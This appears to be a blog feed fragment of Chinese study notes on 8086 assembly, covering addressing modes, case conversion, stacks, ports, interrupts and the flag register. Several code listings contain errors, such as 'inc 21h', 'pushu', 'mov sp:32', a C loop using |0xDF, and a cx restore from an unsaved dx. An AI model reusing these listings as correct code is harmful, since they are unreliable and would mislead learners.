      <category>汇编基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>7-更灵活定位内存地址</title>
    <link href="/2022/02/16/7%E6%9B%B4%E7%81%B5%E6%B4%BB%E5%AE%9A%E4%BD%8D%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80/"/>
    <url>/2022/02/16/7%E6%9B%B4%E7%81%B5%E6%B4%BB%E5%AE%9A%E4%BD%8D%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<h1>1、and指令</h1><p>通过该指令可将操作对象的相应位设为0，其他位不变</p><h1>2、or指令</h1><p>相应位设为1，其他位不变</p><h1>3、以字符形式给出的数据</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">db &#x27;unIX&#x27;   ;相当于db 75H,6EH,49H,58H(分别对应ASCⅡ码)<br></code></pre></td></tr></table></figure><h1>4、大小写转换的问题</h1><p>小写字母的ASCⅡ码值比大写字母的ASCⅡ值大20H</p><p>就ASCⅡ码的二进制形式来看，除第五位（位数从0开始计算）外，大写字母和小写字母的其他各位都一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>db &#x27;BaSiC&#x27;<br>db &#x27;iNfOrMaTiOn&#x27;<br>datasg ends<br><br>codesg segment<br>start: mov ax,datasg<br>   mov ds, ax   ;设置ds指向datasg段<br>   <br>   mov bx, 0     ;设置[bx]=0,ds:bx指向第一个字母<br>   <br>   mov cx, 5     ;设置循环次数5<br>  s: mov al,[bx]    ;将ASCⅡ码从ds：bx所指向的单元中取出<br>    and al,11011111b    ;变为大写字母<br>    mov [bx],al    ;将转换后的ASCⅡ码协会原单元<br>    <br>    inc [bx],al    ;(bx)+1,ds:bx指向下一个字母<br>    loop s<br>    <br>    mov bx,5<br>    <br>    mov cx, 11<br>   s0: mov al, [bx]<br>    or al, 001100000b<br>    mov [bx],al<br>    inc bx<br>    loop s0<br>    <br>    mov ax, 4c00h<br>    inc 21h<br>    <br>codesg ends<br>end start<br>    <br></code></pre></td></tr></table></figure><h1>5、</h1><p>[bx+idata]：表示一个内存单元，它的偏移地址为（bx）+idata</p><p>mov ax,[bx+200]=mov ax,[200+bx]</p><p>​  =mov ax,200[bx]</p><p>​      =mov ax,[bx].200</p><h1>6、用[bx+idata]的方式进行数组的处理</h1><ul><li>有了这种表示内存单元的方式，就可以用更高级的结构来看待所要处理的数据</li><li>上段程序改进</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax, datasg<br>mov ds, ax<br>mov bx,0<br><br>mov cx, 5<br> s:mov al, [bx]<br>   and al, 11011111b<br>   mov [bx],al<br>   mov al,[5+bx]<br>   or al,00100000b<br>   mov [5+bx],al<br>   inc bx<br>   loop s<br> <br></code></pre></td></tr></table></figure><ul><li>C的形式</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> a[<span class="hljs-number">5</span>]=<span class="hljs-string">&quot;BaSiC&quot;</span><br><span class="hljs-type">char</span> b[<span class="hljs-number">5</span>]=<span class="hljs-string">&quot;MinIX&quot;</span><br>main()<br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span>&#123;<br>        a[i]=a[i]|<span class="hljs-number">0xDF</span>;<br>        b[i]=b[i]|<span class="hljs-number">0x20</span>;<br>        i++;<br>    &#125;<span class="hljs-keyword">while</span>(i&lt;<span class="hljs-number">5</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>对比</p><p>C语言定位方式：a[i]、b[i]</p><p>汇编语言定位方式：0[bx]、5[bx]</p></li><li><p>[bx+idata]的方式为高级语言实现数组提供了便利机制</p></li></ul><h1>7、SI和DI</h1><ul><li><p>SI和DI是8086CPU中和bx功能相近的两个寄存器，但是SI和DI不能分成两个8位寄存器来使用</p></li><li><p>[bx],[SI],[DI]都默认段地址在ds中</p></li></ul><h5 id="例">例</h5><p>用寄存器SI和DI实现将字符串‘welcome to masm！’复制到它后面的数据区中</p><ul><li>用ds：si指向要复制的原始字符串</li><li>用ds：地支相复制的目的空间</li><li>用循环复制</li><li>注意：在程序中用16位寄存器进行内存单元之间的数据传送，一次复制2个字节，一共循环8次</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:dodesg,ds:datasg<br>datasg segment<br>  db &#x27;welcome to masm!&#x27;  ;长度为16<br>  db &#x27;................&#x27;<br>datasg ends<br><br>codesg segment<br>start:mov ax,datasg<br>      mov ds,ax<br>      mov si,0<br>      mov di,16<br>      mov cx,8<br>      <br>    s:mov ax,[si]<br>      mov [di],ax<br>      add si,2<br>      add di,2<br>      loop s<br>      <br>      mov ax,4c00h<br>      int 21h<br></code></pre></td></tr></table></figure><h1>8、[bx+si]和[bx+di]</h1><ul><li><p>[bx+si]表示一个内存单元，它的偏移地址为(bx)+(si)</p></li><li><p>mov ax,[bx+si]的含义：将一个内存单元的内容送入ax，这个内存单元的长度为2字节（字单元），存放一个字，段地址在ds中</p></li></ul><h1>9、实例</h1><h5 id="将datasg段中的每个单词的头一个字母改写为大写字母">将datasg段中的每个单词的头一个字母改写为大写字母</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>  db &#x27;1. file         &#x27;<br>  db &#x27;2. edit         &#x27;<br>  db &#x27;3. search       &#x27;<br>  db &#x27;4. view         &#x27;<br>  db &#x27;5. options      &#x27;<br>  db &#x27;6. help         &#x27;<br>datasg ends<br><br>codesg segment<br> start:mov ax,datasg<br>       mov ds,ax<br>       mov bx,0<br>       <br>       mov cx,6<br>     s:mov al,[bx+3]<br>       and al,11011111b<br>       mov [bx+3],al<br>       add bx,16<br>       loop s<br>       <br>       mov ax,4c00h<br>       int 21h<br> codesg ends<br> end start<br></code></pre></td></tr></table></figure><ul><li>datasg中的数据的存储结构</li></ul><table><thead><tr><th></th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th><th>12</th><th>13</th><th>14</th><th>15</th></tr></thead><tbody><tr><td>00</td><td>1</td><td>.</td><td></td><td>f</td><td>i</td><td>l</td><td>e</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>10</td><td>2</td><td>.</td><td></td><td>e</td><td>d</td><td>i</td><td>t</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>······</p><h5 id="将dtasg段中每个单词改为大写字母">将dtasg段中每个单词改为大写字母</h5><p>用bx作为变量，定位每行的起始地址，用si定位要修改的列，用[bx+si]的方式来对目标单元进行寻址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>  db &#x27;ibm             &#x27;<br>  db &#x27;dec             &#x27;<br>  db &#x27;dos             &#x27;<br>  db &#x27;vax             &#x27;<br>datasg ends<br><br>codesg segment<br> start:mov ax,datasg<br>    mov ds,ax<br>    mov bx,0  ;用bx来定位行<br>    <br>    mov cx,4<br>  s0:mov dx,cx  ;用dx寄存器来临时保存外层cx的值 <br>  mov si,0  ;用si来定位列<br>     mov cx,3<br>   s:mov al,[bx+si]<br>     and al,11011111b<br>     mov [bx+si],al<br>     <br>     inc si<br>     <br>     loop s<br>     <br>     add bx,16<br>     mov cx,dx   ;在进行外层循环时恢复cx的值<br>     loop s0<br> <br>        mov ax,4c00h<br>       int 21h<br> codesg ends<br> end start<br></code></pre></td></tr></table></figure><p>当程序比较复杂，需要暂存的数据很多，寄存器不够用时：</p><p>可以考虑将需要暂存的数据放到内存单元中，需要使用的时候再从内存单元中恢复</p><p>修改后的程序如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>  db &#x27;ibm             &#x27;<br>  db &#x27;dec             &#x27;<br>  db &#x27;dos             &#x27;<br>  db &#x27;vax             &#x27;<br>  dw 0   ;定义一个字，用来保存cx<br>datasg ends<br><br>codesg segment<br> start:mov ax,datasg<br>    mov ds,ax<br>    <br>    mov bx,0  ;用bx来定位行<br>    <br>    mov cx,4<br>  s0:mov ds:[20H],cx  ;将外层循环的cx值保存在datasg:40H单元中<br>  mov si,0  ;用si来定位列<br>     mov cx,3<br>   s:mov al,[bx+si]<br>     and al,11011111b<br>     mov [bx+si],al<br>     <br>     inc si<br>     <br>     loop s<br>     <br>     add bx,16<br>     mov cx,dx   ;在进行外层循环时恢复cx的值<br>     loop s0<br> <br>        mov ax,4c00h<br>       int 21h<br> codesg ends<br> end start<br></code></pre></td></tr></table></figure><h5 id="用栈改进">用栈改进</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>  db &#x27;ibm             &#x27;<br>  db &#x27;dec             &#x27;<br>  db &#x27;dos             &#x27;<br>  db &#x27;vax             &#x27;<br>datasg ends<br><br>stacksg segment   ;定义一个段，用来作栈段，容量为16个字节<br>dw 0,0,0,0,0,0,0,0<br>stacksg ends<br><br>codesg segment<br>start:mov ax,stacksg<br>mov ss,ax<br>mov sp,16<br>mov ax,datasg<br>mov ds,ax<br><br>mov bx,0<br><br>mov bx,0<br><br>mov cx,4<br>  s0: push cx    ;将外层循环的cx值压栈<br>    mov si,0<br>    mov cx,3    ;cx设置为内层循环的次数<br>    s:mov al,[bx+si]<br>    and al,11011111b<br>    mov [bx+si],al<br>    inc si<br>    loop s<br>    <br>    add bx,16<br>    pop cx   ;从栈顶弹出原cx的值，恢复cx<br>    loop s0    ;外层循环的loop指令将cx中的计数值-1<br>    <br>    mov ax,4c00h<br>    int 21h<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><h5 id="将datasg段中每个单词的前4个字母改写为大写字母">将datasg段中每个单词的前4个字母改写为大写字母</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg,ss:stacksg<br>stacksg segment<br>  dw 0,0,0,0,0,0,0,0<br>stacksg ends<br>datasg segment<br>  db &#x27;1. display      &#x27;<br>  db &#x27;2. brows        &#x27;<br>  db &#x27;3. replace      &#x27;<br>  db &#x27;4. modify       &#x27;<br>datasg ends<br>codesg segment<br>start:mov ax,stacksg<br>  mov ss,ax<br>  mov sp,16<br>  mov ax,datasg<br>  mov ds,ax<br>  mov bx,0   ;定义行<br>  <br>  mov cx,4<br>s0:push cx<br>   mov si,0   ;定义列<br>   mov cx,4<br> s:mov al,[bx+3+si]   ;定位到每个要索引的字母<br>   and al,11011111b<br>   mov [bx+3+si],al<br>   inc si   ;指向下一个字母<br>   loop s<br>   <br>   add bx,16<br>   pop cx<br>   loop s0<br>   <br>   mov ax,4c00h<br>   int 21h<br><br>codesg ends<br>end start<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>汇编基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>6-包含多个段的程序</title>
    <link href="/2022/02/16/6%E5%8C%85%E5%90%AB%E5%A4%9A%E4%B8%AA%E6%AE%B5%E7%9A%84%E7%A8%8B%E5%BA%8F/"/>
    <url>/2022/02/16/6%E5%8C%85%E5%90%AB%E5%A4%9A%E4%B8%AA%E6%AE%B5%E7%9A%84%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h1>1、对8个数进行累加</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg segment<br>dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h<br>mov bx,0<br>mov ax,0<br>mov cx,8<br>s:add ax,cs:[bx]<br>  add bx,2<br>  loop s<br>  mov ax,4c00h<br>  int 21h<br> codesg ends<br> end<br></code></pre></td></tr></table></figure><ul><li><p>dw：（define word）定义字形数据，dw定义的数据之间以逗号分隔，它们所占的内存空间大小为16个字节</p></li><li><p>数据的段地址：</p><p>由于这8个数在代码段中，程序在运行的时候CS中存放代码段的段地址，所以可以从CS中得到它们的段地址</p></li><li><p>数据的偏移地址：</p><p>因为dw定义的数据处于代码段的最开始，所以偏移地址为0、2、4、6、8、A、C、E处</p><p>程序运行时，它们的地址就是CS：0、CS：2······</p></li></ul><h1>2、在代码段中使用栈</h1><p>逆序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs assembly">codesg seqment<br>dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h<br>dw 0,0,0,0,0,0,0,0  ;用dw定义8个字型数据，在程序加载后，将取地8个字的内存空间存放着8个数据，在后面的程序中将这段空间当作栈来使用<br><br>  start: mov ax,cx<br>         mov ss,ax<br>         mov sp:32   ;蛇者栈顶ss：sp指向cs：32<br>         mov bx,0<br>         mov cx,8<br>       s: pushu cs:[bx]<br>          add bx,2<br>          loop s   ;以上将代码段0~16单元中的8个字型数据依次入栈<br>          <br>          mov bx,0<br>          mov cx,8<br>          <br>        s0: pop cs:[bx]<br>          add bx,2<br>          loop s0     ;以上依次出栈8个字型数据到代码段0~16单元中<br>          mov ax,4c00h<br>          int 21h<br>          <br>codesg ends<br>end start    ;指明程序的入口在start处<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>汇编基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>13-端口</title>
    <link href="/2022/02/16/14%E7%AB%AF%E5%8F%A3/"/>
    <url>/2022/02/16/14%E7%AB%AF%E5%8F%A3/</url>
    
    <content type="html"><![CDATA[<h1>引言</h1><ul><li><p>CPU可以直接读写3个地方的数据：</p><p>1、CPU内部的寄存器</p><p>2、内存单元</p><p>3、端口</p></li></ul><h1>端口的读写</h1><ul><li><p>端口的读写指令只有两条：in和out分别用于从端口读取数据和往端口写入数据</p></li><li><p>CPU执行内存访问指令和端口访问指令时，总线上的信息：</p><p>1、访问内存</p><p>mov ax,ds:[8]，假设执行前（ds）=0，则执行时与总线相关的操作</p><ul><li>CPU通过地址线将地址信息&quot;8&quot;发出</li><li>CPU通过控制线发出内存读命令，选中存储器芯片，并通知它将要从中读取数据</li><li>存储器将8号单元中的数据通过数据线送入CPU</li></ul><p>2、访问端口</p><p>in al，60h；从60h号端口读入一个字节，执行时与总线相关的操作</p><ul><li>CPU通过地址线将地址信息“60h”发出</li><li>CPU通过控制线发出端口读命令，选中端口所在的芯片，并通知它将要从中读取数据</li><li>端口所在芯片将60h端口中的数据通过数据线送入CPU</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>汇编基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>12-内中断</title>
    <link href="/2022/02/16/12%E5%86%85%E4%B8%AD%E6%96%AD/"/>
    <url>/2022/02/16/12%E5%86%85%E4%B8%AD%E6%96%AD/</url>
    
    <content type="html"><![CDATA[<h1>引言</h1><ul><li><p>中断：CPU处理外部突发事件</p></li><li><p>引起中断的原因或者说发出中断请求的来源叫做中断源</p></li><li><p>分类：</p><ul><li>硬件中断<ul><li>外部中断</li><li>内部中断</li></ul></li><li>软件中断</li></ul></li><li><p>外部中断</p><ul><li>一般是指由计算机外设发出的中断请求</li><li>如键盘中断、打印机中断、定时器中断等</li><li>外部中断是可以屏蔽的中断</li><li>利用中断控制器可以屏蔽这些外部设备的中断请求</li></ul></li><li><p>内部中断</p><ul><li>因硬件出错（突然掉电、奇偶校验出错等）或运算出错（除数为0、运算溢出、单步中断等）所引起的中断</li><li>内部中断是不可屏蔽的中断</li></ul></li><li><p>软件中断</p><ul><li>软件中断其实并不是真正的中断，它只是可被调用执行的一般程序以及DOS的系统功能调用（int 21H）等都是软件中断</li></ul></li><li><p>CPU为了处理并发的中断请求，规定了中断的优先权（高到低）：</p><p>1、除法错误、溢出中断、软件中断</p><p>2、不可屏蔽中断</p><p>3、可屏蔽中断</p><p>4、单步中断</p></li></ul><h1>中断处理程序</h1><ul><li>CPU根据中断类型码4，可以找到4号中断的处理程序</li><li>若要定位中断处理程序，需要知道它的段地址和偏移地址，如何根据8位的中断类型码（8086中断类型码为一个字节）得到中断处理程序的段地址和偏移地址—&gt;中断向量表</li></ul><h1>中断向量表</h1><ul><li>CPU用8位的中断类型码通过中断向量表找到相应的中断处理程序的入口地址</li><li>中断向量表在内存中保存，其中存放着256个中断源所对应的中断处理程序的入口</li><li>对于8086PC机，中断向量表指定放在内存地址0处</li><li>从内存0000：0000到0000：03FF的1024个单元中存放着中断向量表</li></ul><h1>中断过程</h1><p>1、（从中断信息中）取得中断类型码</p><p>2、标志寄存器的值入栈（保护标志位）</p><p>3、设置标志寄存器的第8位TF和第9位IF的值为0</p><p>4、CS的内容入栈</p><p>5、IP的内容入栈</p><p>6、从内存地址为中断类型码 * 4和中断类型码 * 4+2的两个字单元中读取中断处理程序的入口地址设置IP和CS</p><ul><li><p>简洁描述</p><p>1、取得中断类型码N</p><p>2、pushf</p><p>3、TF=0，IF=0</p><p>4、push CS</p><p>5、push IP</p><p>6、（IP）=（N*4），（cs）=（N * 4+2）</p></li></ul><h1>中断处理程序</h1><ul><li><p>步骤</p><p>1、保存用到的寄存器</p><p>2、处理中断</p><p>3、恢复用到的寄存器</p><p>4、用iret指令返回</p></li><li><p>iret指令的功能用汇编语言描述</p><p>pop IP</p><p>pop CS</p><p>popf</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>汇编基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>11-标志寄存器</title>
    <link href="/2022/02/16/11%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <url>/2022/02/16/11%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1>引言</h1><ul><li>8086CPU的标志寄存器（flag）有16位，其中存储二点信息通常被称为程序状态字（PSW）</li><li>其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器是按位起作用的，也就是说，它的每一位都有专门的含义，记录特定的信息</li></ul><h1>ZF标志</h1><ul><li>ZF：零标志位</li><li>记录相关指令执行后：结果为0，ZF=1；结果不为0，ZF=0</li></ul><h1>PF标志</h1><ul><li><p>flag的第2位</p></li><li><p>奇偶标志位</p></li><li><p>记录指令执行后，结果的所有二进制位中1的个数：</p><p>为偶数：PF=1</p><p>为奇数：PF=0</p></li></ul><h1>SF标志</h1><ul><li><p>7</p></li><li><p>符号标志位</p></li><li><p>指令执行后：</p><p>结果为负，SF=1</p><p>结果为正，SF=0</p></li><li><p>是CPU对有符号数运算结果的一种记录，它记录数据的正负</p></li><li><p>如果将数据当作无符号数来运算，SF的值则没有意义</p></li></ul><h1>CF标志</h1><ul><li>0</li><li>进位标志位</li><li>一般情况下，在进行无符号数运算时，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值</li><li>对于位数为N的无符号数来说，其对应的二进制信息的最高位，即N-1位的最高有效位，而假想存在的第N位，就是相对于最高有效位的更高位</li><li>产生借位置为cy、无借位为nc</li></ul><h1>OF标志</h1><ul><li>在进行<strong>有符号数</strong>运算时，如结果超过了机器所能表示的范围称为溢出</li><li>值为1的标记：OV、值为0的标记：NV</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,98<br>add al,99<br><br>;add指令运算的结果是(al)=0C5H，因为进行的是有符号数运算，所以al中存储的是有符号数，而0C5H是有符号数-59的补码<br></code></pre></td></tr></table></figure><h1>adc指令</h1><ul><li><p>adc是带进位加法指令，它利用了CF位商记录的值进位</p></li><li><p>格式：adc 操作对象1，操作对象2</p></li><li><p>功能：操作对象1=操作对象1+操作对象2+CF</p></li><li><p>例：adc ax，bx —&gt;(ax)=(ax)+(bx)+CF</p></li><li><p>在执行adc指令的时候加上的CF的值的含义由adc指令前面的指令决定，即关键在于所加上的CF值是被什么指令设置的</p><ul><li>如果CF的值是被sub指令设置的，那么它的含义就是借位值</li><li>如果是被add指令设置的，那么它的含义就是进位值</li></ul></li><li><p>编程：</p><ul><li>计算1EF000H+201000H，结果放在ax（高16位）和bx（低16位）中</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,001EH<br>mov bx,0F000H<br>add bx,1000H  ;10000<br>adc ax,0020H<br></code></pre></td></tr></table></figure><ul><li><p>编写一个子程序，对两个128位数据进行相加</p><p>参数：ds:si指向存储的第一个数的内存空间，因数据为128位，所以需要8个字单元，由低地址单元到高地址单元依次存放128位数据由高到低的各个字，运算结果存储在第一个数的存储空间中</p><p>ds:di指向存储的第二个数的内存空间</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code,ds:data<br>data segment<br>db 88h,88h,88h,88h,88h,88h,88h,88h,88h,88h,88h,88h,88h,88h,88h,88h<br>db 11h,11h,11h,11h,11h,11h,11h,11h,11h,11h,11h,11h,11h,11h,11h,11h<br>data ends<br><br>code segment<br>start:mov ax,data<br>  mov ds,ax<br>  mov si,0<br>  mov di,16<br>  <br>  mov cx,8<br>  <br>  call add128<br>  <br>  mov ax,4c00h<br>  int 21h<br>  <br>add128: push ax<br>push cx<br>push si<br>push di<br><br>sub ax,ax  ;将CF设置为0<br> S: mov ax,[si]<br> adc ax,[di]<br> mov [si],ax<br> inc si<br> inc si<br> inc di<br> inc di<br> loop s<br> <br> pop di<br> pop si<br> pop cx<br> pop ax<br> ret<br> <br>code ends<br>end start<br></code></pre></td></tr></table></figure></li></ul><h1>sbb指令</h1><ul><li>带借位减法指令，利用CF位上记录的借位值</li><li>格式：sbb 